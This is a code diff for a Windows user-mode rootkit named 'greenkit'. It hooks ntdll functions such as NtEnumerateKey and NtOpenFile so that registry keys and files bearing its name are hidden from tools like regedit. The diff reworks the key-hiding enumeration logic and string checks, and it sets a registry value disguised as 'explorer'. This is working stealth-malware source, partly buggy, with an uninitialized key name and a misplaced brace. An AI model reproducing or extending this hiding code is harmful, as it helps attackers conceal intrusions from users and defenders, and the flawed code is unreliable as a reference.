@@ -23,6 +23,27 @@
 #define REGKEY_VALUE "explorer"
 #define FILE_TAG "EXAMPLE"
 
+BOOL _strCmp(const char *str1, const char *str2, int size) {
+	int i = 0;
+	for (i = 0; str1[i] && i < size; ++i) {
+		if (str2[i] != str1[i])
+			return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOL _strCmpC(const char *str1, const char *str2, int size) {
+	int i = 0;
+	for (i = 0; str1[i] && i < size; ++i) {
+		if (str2[i] > str1[i])
+			return FALSE;
+	}
+
+	return TRUE;
+}
+
+
 VOID WriteFile(char token)
 {
     HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
@@ -105,51 +126,24 @@ typedef VOID(NTAPI *TD_FreeAnsiString)(
     );
 
 BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
-    UNICODE_STRING abc;
-    ANSI_STRING ansi_abc;
-    ansi_abc.Buffer = "greenkit";
-    ansi_abc.Length = 8;
-    ansi_abc.MaximumLength = 1024;
-    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
-        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
-        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
-        "RtlAnsiStringToUnicodeString");
-
-    ansi_to_uni(&abc, &ansi_abc, TRUE);
-
-    TD_RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
-        (_In_ PCUNICODE_STRING String1,
-        _In_ PCUNICODE_STRING String2,
-        _In_ BOOLEAN          CaseInSensitive
-        ))GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCompareUnicodeString");
-    if (compare_uni(&abc, &uStr_reg, true) <= 0)
-        return TRUE;
-    return FALSE;
+	std::string c("greenkit");
+	char str[500];
+	wcstombs(str, uStr_reg.Buffer, 500);
+	
+	if (_strCmpC(c.c_str(), str, 8))
+		return TRUE;
+	else
+		return FALSE;
 }
 
 BOOL mustHideReg(UNICODE_STRING uStr_reg) {
-
-    UNICODE_STRING abc;
-    ANSI_STRING ansi_abc;
-    ansi_abc.Buffer = "greenkit";
-    ansi_abc.Length = 8;
-    ansi_abc.MaximumLength = 1024;
-    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
-        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
-        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
-        "RtlAnsiStringToUnicodeString");
-
-    ansi_to_uni(&abc, &ansi_abc, TRUE);
-
-    TD_RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
-        (_In_ PCUNICODE_STRING String1,
-        _In_ PCUNICODE_STRING String2,
-        _In_ BOOLEAN          CaseInSensitive
-        ))GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCompareUnicodeString");
-
-    if (compare_uni(&abc, &uStr_reg, true) == 0)
-        return TRUE;
-    return FALSE;
+	std::string c("greenkit");
+	char str[500];
+	wcstombs(str, uStr_reg.Buffer, 500);
+	if (_strCmp(str, c.c_str(), 8))
+		return TRUE;
+	else
+		return FALSE;
 }
 
 PVOID getKeyName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
@@ -206,82 +200,140 @@ NTSTATUS WINAPI NewNtOpenFile(
     return 0;//status; // STATUS_NO_SUCH_FILE
 }
 
-NTSTATUS NTAPI NewNtEnumerateKey(
-    HANDLE					KeyHandle,
-    ULONG					Index,
-    KEY_INFORMATION_CLASS	KeyInformationClass,
-    PVOID					KeyInformation,
-    ULONG					Length,
-    PULONG					ResultLength)
+ULONG getKeyEntryNameLength(PVOID KeyInformation,KEY_INFORMATION_CLASS KeyInformationClass)
 {
-    NTSTATUS ret;
-    UNICODE_STRING uStr_tmp;
-    UNICODE_STRING abc;
-    ANSI_STRING ansi_abc;
-    ansi_abc.Buffer = "greenkit";
-    ansi_abc.Length = 8;
-    ansi_abc.MaximumLength = 1024;
-    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
-        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
-        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
-        "RtlAnsiStringToUnicodeString");
+	ULONG ulResult=0;
 
-    ansi_to_uni(&abc, &ansi_abc, TRUE);
-
-    ULONG tmpIndex = Index;
-    ULONG tmpInt = 0;
-    HANDLE h_tmp;
-    OBJECT_ATTRIBUTES ObjectAttributes;
-
-    if (KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation) {
-        ret = originalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
-        if (NT_SUCCESS(ret)) {
-            uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
-            uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
-
-            if (mustShiftReg(uStr_tmp)) { // TODO change this part for more than one key to hide {
-                TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
-                NTSTATUS status;
-                InitializeObjectAttributes(&ObjectAttributes, &abc, 0, KeyHandle, NULL);
-                if (NT_SUCCESS(_NtOpenKey(&h_tmp, GENERIC_READ, &ObjectAttributes))) {
-                    ++tmpIndex;
-                    CloseHandle(h_tmp);
-                }
-            }
-
-            if (tmpIndex != Index) {
-                ret = originalNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
-                if (ret != STATUS_SUCCESS)
-                    return ret;
-                if (mustHideReg(uStr_tmp))
-                    ++tmpIndex;
-            }
-
-            do {
-                ret = originalNtEnumerateKey(KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
-                if (ret != STATUS_SUCCESS)
-                    return ret;
-                if (!mustHideReg(uStr_tmp))
-                    break;
-                else
-                    ++tmpInt;
-            } while (TRUE);
-        }
-    }
-    return originalNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
-}
-
-/* NT QUERY DIRECTORY FILE */
-
-BOOL _strCmp(const char *str1, const char *str2, int size) {
-	int i = 0;
-	for (i = 0; str1[i] && i < size; ++i) {
-		if (str2[i] != str1[i])
-			return FALSE;
+	switch(KeyInformationClass)
+	{
+		case KeyBasicInformation:
+			ulResult=((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
+			break;
+		case KeyNodeInformation:
+			ulResult=((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
+			break;
 	}
 
-	return TRUE;
+	return ulResult;
 }
+
+NTSTATUS WINAPI NewNtEnumerateKey(
+	HANDLE KeyHandle,
+	ULONG Index,
+	KEY_INFORMATION_CLASS KeyInformationClass,
+	PVOID KeyInformation,
+	ULONG Length,
+	PULONG ResultLength
+	)
+{
+	NTSTATUS rc;
+	ULONG Shift = 0;
+
+	if (KeyInformationClass == KeyBasicInformation ||
+		KeyInformationClass == KeyNodeInformation)
+	{
+		OBJECT_ATTRIBUTES ObjectAttributes;
+		UNICODE_STRING dbg, usKey;
+		ANSI_STRING asKey;
+		ULONG tmpIndex, i = 0;
+		BOOL bFound = FALSE;
+		HANDLE hTmp;
+
+		// call original function
+		rc = originalNtEnumerateKey(
+			KeyHandle,
+			Index,
+			KeyInformationClass,
+			KeyInformation,
+			Length,
+			ResultLength
+			);
+
+		if (NT_SUCCESS(rc))
+		{
+			dbg.Buffer = (LPWSTR) getKeyEntryName(KeyInformation, KeyInformationClass);
+			dbg.Length = (USHORT) getKeyEntryNameLength(KeyInformation, KeyInformationClass);
+
+			if (mustShiftReg(dbg))
+				{
+					MessageBoxW(0, dbg.Buffer, L"Regedit", MB_OK | MB_ICONERROR);
+					InitializeObjectAttributes(&ObjectAttributes, &usKey, 0, KeyHandle, NULL);
+					TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
+					NTSTATUS status;
+					if (_NtOpenKey(&hTmp, GENERIC_READ, &ObjectAttributes) == STATUS_SUCCESS)
+					{
+						Shift++;
+						CloseHandle(hTmp);
+					}
+				}
+
+			}
+
+			if (Shift)
+			{
+				ULONG Shoft = Shift;
+				tmpIndex = Index + 1;
+				do
+				{	// check how many keys there are before our shifted key
+					Shoft--;
+					rc = originalNtEnumerateKey(
+						KeyHandle,
+						tmpIndex++,
+						KeyInformationClass,
+						KeyInformation,
+						Length,
+						ResultLength
+						);
+
+					if (rc != STATUS_SUCCESS)
+						return(rc);
+
+					dbg.Buffer = (LPWSTR) getKeyEntryName(KeyInformation, KeyInformationClass);
+					dbg.Length = (USHORT)getKeyEntryNameLength(KeyInformation, KeyInformationClass);
+					bFound = mustHideReg(dbg);
+					if (bFound)
+						Shift++;
+				} while (Shoft>0);
+
+				tmpIndex = Index + Shift;
+				do
+				{	// check if final key should be hidden
+						rc = originalNtEnumerateKey(
+						KeyHandle,
+						tmpIndex++,
+						KeyInformationClass,
+						KeyInformation,
+						Length,
+						ResultLength
+						);
+
+					if (rc != STATUS_SUCCESS)
+						return(rc);
+
+					dbg.Buffer = (LPWSTR) getKeyEntryName(KeyInformation, KeyInformationClass);
+					dbg.Length = (USHORT)getKeyEntryNameLength(KeyInformation, KeyInformationClass);
+					bFound = mustHideReg(dbg);
+					if (bFound)
+						Shift++;
+				} while (bFound);
+			}
+		}
+
+	// call original function
+	rc = originalNtEnumerateKey(
+		KeyHandle,
+		Index + Shift,
+		KeyInformationClass,
+		KeyInformation,
+		Length,
+		ResultLength
+		);
+
+	return rc;
+}
+
+
+/* NT QUERY DIRECTORY FILE */
 
 BOOL mustHideFile(UNICODE_STRING file) {
 	std::string a("greenkit.txt");
